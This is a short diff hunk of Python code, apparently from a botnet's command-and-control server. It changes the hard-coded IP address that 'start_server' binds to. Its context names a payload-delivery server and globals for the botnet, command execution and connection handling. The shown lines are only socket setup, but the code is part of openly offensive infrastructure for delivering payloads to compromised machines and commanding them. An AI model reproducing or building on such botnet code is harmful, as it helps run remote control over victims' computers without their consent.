@@ -48,7 +48,7 @@ def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
         except Exception as ee:
             print("[*] An Unknown Error Occurred : %s"%(str(ee)))
 
-def start_server(port=2003,ip="157.230.227.120"):
+def start_server(port=2003,ip="159.65.11.28"):
     global botnet,exec_command,on_connect_exit
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
